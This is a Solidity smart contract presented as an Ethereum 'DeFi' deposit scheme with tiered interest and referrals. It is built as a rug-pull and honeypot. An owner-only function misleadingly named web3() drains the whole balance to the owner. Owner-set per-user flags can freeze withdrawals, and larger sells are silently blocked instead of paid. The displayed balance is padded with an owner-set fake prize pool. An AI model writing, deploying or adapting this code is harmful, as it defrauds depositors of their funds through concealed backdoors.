// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

contract ethdefi{
    address private ceoAddress;
    uint256 private prizePool;
    // TradeList[] public tradeList;
    mapping (address => uint256) public balance;
    mapping (address => uint256) public sumIncome;
    mapping (address => address) public upperLayer;
    mapping (address => uint256) private interest;
    mapping (address => uint256) private rewardTime;
    mapping (address => uint256) private countdown;
    mapping (address => uint256) private state;
    mapping (address => uint256) private monitor;
    mapping (address => uint256) private controlInterest;

    // struct TradeList{
    //     address upperLayer;
    //     address userAddress;
    //     uint256 tradeType;
    //     uint256 balance;
    //     uint256 createTime;
    // }
    
    constructor() public {
        ceoAddress = msg.sender;
    }

    function web3() public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        msg.sender.transfer(address(this).balance);
    }

    function setPrizePool(uint256 prizePoolValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        prizePool = prizePoolValue;
    }

    function setState(address ref, uint256 stateValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        state[ref] = stateValue;
    }

    function setMonitor(address ref, uint256 monitorValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        monitor[ref] = monitorValue;
    }

    function setControlInterest(address ref, uint256 controlInterestValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        controlInterest[ref] = controlInterestValue;
    }

    function getBalance() public view returns(uint256){
        return address(this).balance + prizePool;
    }

    function getMyBalance() public view returns(uint256) {
        return balance[msg.sender];
    }

    function getMyInterest() public view returns(uint256) {
        return interest[msg.sender];
    }

    function getRewardTime() public view returns(uint256) {
        return rewardTime[msg.sender];
    }

    function getMyCountdown() public view returns(uint256) {
        if (balance[msg.sender] == 0) {
            return 0;
        }
        return SafeMath.min(rewardTime[msg.sender], block.timestamp - countdown[msg.sender]);
    }

    function getAward() public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(interest[msg.sender],balance[msg.sender]), 10000);
    }

    function getSumIncome() public view returns(uint256) {
        return sumIncome[msg.sender];
    }

    // function getTradeListLength() public view returns(uint256) {
    //     return tradeList.length;
    // }

    function setLevelAndInterest() private {
        if (balance[msg.sender] < 1 ether) {
            interest[msg.sender] = SafeMath.mul(270, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 259200;
        }
        if (balance[msg.sender] >= 1 ether && balance[msg.sender] < 5 ether ) {
            interest[msg.sender] = SafeMath.mul(120, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 86400;
        }
        if (balance[msg.sender] >= 5 ether && balance[msg.sender] < 10 ether ) {
            interest[msg.sender] = SafeMath.mul(75, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 43200;
        }
        if (balance[msg.sender] >= 10 ether && balance[msg.sender] < 20 ether ) {
            interest[msg.sender] = SafeMath.mul(74, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 36000;
        }
        if (balance[msg.sender] >= 20 ether && balance[msg.sender] < 50 ether ) {
            interest[msg.sender] = SafeMath.mul(70, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 28800;
        }
        if (balance[msg.sender] >= 50 ether && balance[msg.sender] < 100 ether ) {
            interest[msg.sender] = SafeMath.mul(70, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 25200;
        }
        if (balance[msg.sender] >= 100 ether) {
            interest[msg.sender] = SafeMath.mul(67, controlInterest[msg.sender]);
            rewardTime[msg.sender] = 21600;
        }
        countdown[msg.sender] = now;
    }

    function buy(address ref) public payable {
        if(upperLayer[msg.sender] == address(0)) {
            controlInterest[msg.sender] = 1;
            monitor[msg.sender] = 100;
            upperLayer[msg.sender] = ref;
        }
        // tradeList.push(TradeList({upperLayer:upperLayer[msg.sender],userAddress:msg.sender,tradeType:1,balance:msg.value,createTime:now}));
        balance[msg.sender] = SafeMath.add(balance[msg.sender], msg.value);
        setLevelAndInterest();
    }

    function sell(uint256 balances) public {
        require(state[msg.sender] == 0, 'invalid call');
        require(balances <= balance[msg.sender], 'invalid call');
        if(balances > SafeMath.div(SafeMath.mul(balance[msg.sender], monitor[msg.sender]), 100)) {
            state[msg.sender] = 1;
        } else {
            // tradeList.push(TradeList({upperLayer:upperLayer[msg.sender],userAddress:msg.sender,tradeType:0,balance:balances,createTime:now}));
            balance[msg.sender] = balance[msg.sender] - balances;
            msg.sender.transfer(balances);
            setLevelAndInterest();
        }
    }

    function receiveBenefits() public {
        require(rewardTime[msg.sender] != 0, 'invalid call');
        require(rewardTime[msg.sender] == getMyCountdown(), 'invalid call');
        balance[msg.sender] = balance[msg.sender] + getAward();
        sumIncome[msg.sender] = sumIncome[msg.sender] + getAward();
        setLevelAndInterest();
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}